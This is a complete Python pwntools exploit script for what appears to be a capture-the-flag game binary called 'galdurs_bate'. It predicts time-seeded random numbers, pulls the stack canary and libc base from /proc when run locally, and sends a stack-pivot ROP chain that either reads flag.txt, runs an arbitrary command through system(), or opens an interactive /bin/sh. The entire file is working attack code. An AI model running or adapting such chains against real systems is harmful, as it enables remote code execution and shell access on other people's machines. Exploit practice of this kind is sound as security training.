#!/usr/bin/env python3
from argparse import ArgumentParser
from ctypes import CDLL
from pathlib import Path
import os
import struct
import time

from pwn import *


ROOT = Path(__file__).resolve().parent
BIN = ROOT / "galdurs_bate"
LIBC = ROOT / "libc.so.6"

elf = ELF(str(BIN), checksec=False)
libc = ELF(str(LIBC), checksec=False)
context.binary = elf
context.log_level = os.environ.get("LOG", "info")

PLAYER_DESCRIPTION = elf.sym["player_description"]
POP_RDI = 0x4012BE
POP_RDX = 0x4012C0
XCHG_RSI_RDI = 0x4012C2
LEAVE_RET = 0x4012EB
RET = 0x40101A


def s64(v):
    return struct.unpack("<q", p64(v & 0xFFFFFFFFFFFFFFFF))[0]


def u64_from_proc(pid, addr):
    with open(f"/proc/{pid}/mem", "rb", buffering=0) as mem:
        mem.seek(addr)
        return u64(mem.read(8))


def local_canary(pid):
    auxv = Path(f"/proc/{pid}/auxv").read_bytes()
    at_random = None
    for i in range(0, len(auxv), 16):
        key, val = struct.unpack("<QQ", auxv[i : i + 16])
        if key == 25:
            at_random = val
            break
    if at_random is None:
        raise RuntimeError("AT_RANDOM not found")
    return u64_from_proc(pid, at_random) & 0xFFFFFFFFFFFFFF00


def local_libc_info(pid):
    maps = Path(f"/proc/{pid}/maps").read_text()
    for line in maps.splitlines():
        if "libc.so.6" in line and "r-xp" in line:
            parts = line.split()
            start = int(line.split("-", 1)[0], 16)
            offset = int(parts[2], 16)
            return start - offset, parts[-1]
    raise RuntimeError("libc base not found")


def predicted_rands(window):
    clibc = CDLL("libc.so.6")
    now = int(time.time())
    offsets = [0]
    for i in range(1, window + 1):
        offsets += [-i, i]
    for off in offsets:
        seed = now + off
        clibc.srand(seed)
        yield seed, clibc.rand()


def start(args):
    if args.local:
        return process(str(BIN))
    return remote(args.host, args.port)


def init_game(io, rop_blob):
    io.recvuntil(b"Chracter name: ")
    io.send(b"ABCDEFGH")
    for prompt in (b"strength", b"dexterity", b"charisma"):
        io.recvuntil(prompt)
        io.sendline(b"1")
    io.recvuntil(b"Character description: ")
    io.send(rop_blob.ljust(200, b"A"))


def go_to_riddle(io):
    io.recvuntil(b"Enter your choice: ")
    io.send(b"1\n")
    io.recvuntil(b"Enter your choice: ")
    io.send(b"4\n")
    io.recvuntil(b"Enter your guess: ")


def set_rsi(value):
    return flat(POP_RDI, value, XCHG_RSI_RDI)


def build_rop(libc_base, libc_elf, command=None, shell=False, flag_path="flag.txt"):
    system = libc_base + libc_elf.sym["system"]
    if command:
        arg = PLAYER_DESCRIPTION + 0x80
    elif not shell:
        open_fn = libc_base + libc_elf.sym["open"]
        path = PLAYER_DESCRIPTION + 0xB0
        buf = PLAYER_DESCRIPTION + 0x200
        chain = flat(
            0xDEADBEEFDEADBEEF,
            set_rsi(0),
            POP_RDI,
            path,
            POP_RDX,
            0,
            RET,
            open_fn,
            set_rsi(buf),
            POP_RDI,
            3,
            POP_RDX,
            0x100,
            elf.plt["read"],
            POP_RDI,
            buf,
            elf.plt["puts"],
        )
        return chain.ljust(0xB0, b"B") + flag_path.encode() + b"\x00"
    else:
        arg = libc_base + next(libc_elf.search(b"/bin/sh\x00"))
    target = elf.plt["puts"] if command == "PUTS" else system
    chain = flat(
        0xDEADBEEFDEADBEEF,
        POP_RDI,
        arg,
        RET,
        target,
    )
    if command:
        text = b"ROP_OK" if command == "PUTS" else command.encode()
        chain = chain.ljust(0x80, b"B") + text + b"\x00"
    return chain


def try_exploit(args, canary, libc_base, guess):
    io = start(args)
    if args.local:
        canary = local_canary(io.pid)
        libc_base, libc_path = local_libc_info(io.pid)
        libc_elf = ELF(libc_path, checksec=False)
        log.info("canary = %#x", canary)
        log.info("libc_base = %#x", libc_base)
    else:
        libc_elf = libc
    rop_blob = build_rop(libc_base, libc_elf, args.cmd, args.shell, args.flag_path)
    init_game(io, rop_blob)
    go_to_riddle(io)
    io.sendline(str(guess).encode())

    try:
        got = io.recvuntil(b"Menthara's strength", timeout=1)
    except EOFError:
        io.close()
        return False
    if b"Menthara's strength" not in got:
        io.close()
        return False

    io.recvuntil(b": ")
    io.sendline(str(s64(canary)).encode())
    io.recvuntil(b"Menthara's dexterity")
    io.recvuntil(b": ")
    io.sendline(str(PLAYER_DESCRIPTION).encode())
    io.recvuntil(b"Menthara's charisma")
    io.recvuntil(b": ")
    io.sendline(str(LEAVE_RET).encode())

    io.recvuntil(b"Enter your choice: ")
    io.send(b"5\n")
    if args.cmd or not args.shell:
        print(io.recvrepeat(1).decode("latin1", errors="replace"))
        io.close()
        return True
    io.interactive()
    return True


def main():
    ap = ArgumentParser()
    ap.add_argument("host", nargs="?")
    ap.add_argument("port", nargs="?", type=int)
    ap.add_argument("--local", action="store_true", help="run ./galdurs_bate locally")
    ap.add_argument("--canary", type=lambda x: int(x, 0), help="required for remote")
    ap.add_argument("--libc-base", type=lambda x: int(x, 0), help="remote libc base if known")
    ap.add_argument("--window", type=int, default=3, help="time seed window")
    ap.add_argument("--attempts", type=int, default=20, help="seed retry rounds")
    ap.add_argument("--cmd", help="send one command after exploitation instead of interactive")
    ap.add_argument("--shell", action="store_true", help="spawn /bin/sh instead of ORW flag read")
    ap.add_argument("--flag-path", default="flag.txt", help="path used by the ORW payload")
    args = ap.parse_args()

    if not args.local and (args.host is None or args.port is None):
        ap.error("use --local or provide HOST PORT")

    canary = None
    libc_base = None
    if not args.local:
        if args.canary is None:
            ap.error("remote mode needs --canary; this binary does not leak it over the game protocol")
        canary = args.canary
        libc_base = args.libc_base
        if libc_base is None:
            log.warning("using libc base 0; pass --libc-base unless ASLR is disabled")
            libc_base = 0

    tried = set()
    for _ in range(args.attempts):
        for seed, guess in predicted_rands(args.window):
            if seed in tried:
                continue
            tried.add(seed)
            log.info("trying seed=%d guess=%d", seed, guess)
            try:
                if try_exploit(args, canary, libc_base, guess):
                    return
            except EOFError:
                pass

    log.failure("no seed in window worked")


if __name__ == "__main__":
    main()